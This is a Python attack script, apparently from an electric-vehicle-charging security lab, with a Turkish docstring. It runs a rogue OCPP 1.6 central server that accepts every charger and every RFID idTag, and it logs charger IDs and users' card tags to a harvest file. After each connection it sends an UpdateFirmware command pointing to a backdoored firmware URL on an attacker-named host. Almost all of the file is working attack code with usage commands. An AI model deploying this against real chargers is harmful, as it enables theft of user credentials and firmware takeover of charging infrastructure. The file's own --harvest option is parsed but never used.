"""
SALDIRI 2 - Rogue CSMS.

Sahte bir Central System sunucusu calistirir. EVSE'nin DNS'i kacirilmis veya
config'i degistirilmis varsayilir, EVSE bu sunucuya baglanir.

Sahte CSMS sunlari yapar:
  - BootNotification'a Accepted doner (mesru gorunmek icin)
  - Authorize'a Accepted doner (her idTag'i kabul eder)
  - Baglanan tum charge box ID'lerini ve gelen idTag'leri 'harvested.json' dosyasina yazar
  - 5 saniye sonra UpdateFirmware komutu gondererek sahte firmware indirme yolu olduragunu gosterir

Kullanim:
    python attacks/rogue_csms.py --port 8500 --harvest captures/harvested.json

    # EVSE'yi sahte sunucuya baglat:
    python evse-sim/charge_point.py \
        --csms ws://localhost:8500/CentralSystemService \
        --cp-id EVSE-001 --auto-charge --id-tag REAL-USER-CARD-42
"""
import argparse
import asyncio
import json
import logging
from datetime import datetime, timezone
from pathlib import Path

import websockets

from ocpp.routing import on
from ocpp.v16 import ChargePoint as Cp
from ocpp.v16 import call, call_result
from ocpp.v16.enums import (
    Action, AuthorizationStatus, RegistrationStatus,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [rogue-csms] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("rogue")

HARVEST_PATH = Path("captures/harvested.json")
ROGUE_FIRMWARE_URL = "http://attacker.lab/payload/backdoored-firmware.bin"


class CentralSystem(Cp):
    """Sahte CSMS perspektifi: EVSE'den gelen mesajlari kabul eder."""

    def __init__(self, cp_id, ws):
        super().__init__(cp_id, ws)
        self.cp_id = cp_id

    @on(Action.boot_notification)
    async def on_boot_notification(self, charge_point_vendor, charge_point_model, **kwargs):
        log.warning("HARVEST cp_id=%s vendor=%s model=%s", self.cp_id, charge_point_vendor, charge_point_model)
        harvest({"event": "boot", "cp_id": self.cp_id, "vendor": charge_point_vendor, "model": charge_point_model})
        return call_result.BootNotification(
            current_time=datetime.now(timezone.utc).isoformat(timespec="seconds"),
            interval=30,
            status=RegistrationStatus.accepted,
        )

    @on(Action.heartbeat)
    async def on_heartbeat(self):
        return call_result.Heartbeat(current_time=datetime.now(timezone.utc).isoformat(timespec="seconds"))

    @on(Action.status_notification)
    async def on_status(self, **kwargs):
        log.info("status %s", kwargs.get("status"))
        return call_result.StatusNotification()

    @on(Action.authorize)
    async def on_authorize(self, id_tag, **kwargs):
        log.warning("HARVEST cp_id=%s idTag=%s (her seyi kabul ediyoruz)", self.cp_id, id_tag)
        harvest({"event": "authorize", "cp_id": self.cp_id, "id_tag": id_tag})
        return call_result.Authorize(id_tag_info={"status": AuthorizationStatus.accepted})

    @on(Action.start_transaction)
    async def on_start(self, connector_id, id_tag, meter_start, timestamp, **kwargs):
        log.warning("HARVEST cp_id=%s START idTag=%s meterStart=%s", self.cp_id, id_tag, meter_start)
        harvest({"event": "start_tx", "cp_id": self.cp_id, "id_tag": id_tag, "meter_start": meter_start})
        return call_result.StartTransaction(
            transaction_id=1,
            id_tag_info={"status": AuthorizationStatus.accepted},
        )

    @on(Action.meter_values)
    async def on_meter(self, connector_id, meter_value, transaction_id=None, **kwargs):
        return call_result.MeterValues()

    @on(Action.stop_transaction)
    async def on_stop(self, transaction_id, **kwargs):
        log.info("STOP tx=%s", transaction_id)
        return call_result.StopTransaction()


def harvest(record: dict):
    HARVEST_PATH.parent.mkdir(parents=True, exist_ok=True)
    record["ts"] = datetime.now(timezone.utc).isoformat()
    with HARVEST_PATH.open("a", encoding="utf-8") as f:
        f.write(json.dumps(record) + "\n")


async def on_connect(ws):
    """Yeni baglanti acildiginda CP nesnesi yaratip baslat."""
    path = ws.request.path if hasattr(ws, "request") else getattr(ws, "path", "")
    cp_id = path.rstrip("/").split("/")[-1] or "unknown"
    sub = ws.subprotocol if hasattr(ws, "subprotocol") else "?"
    log.warning("YENI BAGLANTI cp_id=%s subprotocol=%s", cp_id, sub)

    cs = CentralSystem(cp_id, ws)

    async def lure_firmware_update():
        await asyncio.sleep(5)
        try:
            log.error("LURE: EVSE'ye UpdateFirmware gonderiyoruz URL=%s", ROGUE_FIRMWARE_URL)
            await cs.call(call.UpdateFirmware(
                location=ROGUE_FIRMWARE_URL,
                retrieve_date=datetime.now(timezone.utc).isoformat(timespec="seconds"),
            ))
            harvest({"event": "firmware_lure_sent", "cp_id": cp_id, "url": ROGUE_FIRMWARE_URL})
        except Exception as e:
            log.error("firmware lure failed: %s", e)

    asyncio.create_task(lure_firmware_update())
    await cs.start()


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8500)
    ap.add_argument("--harvest", default=str(HARVEST_PATH))
    args = ap.parse_args()
    HARVEST_PATH.parent.mkdir(parents=True, exist_ok=True)
    log.warning("Sahte CSMS dinliyor: ws://0.0.0.0:%d/CentralSystemService/<cp-id>", args.port)
    log.warning("Harvest dosyasi: %s", args.harvest)
    async with websockets.serve(on_connect, "0.0.0.0", args.port, subprotocols=["ocpp1.6"]):
        await asyncio.Future()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Kapaniyor.")
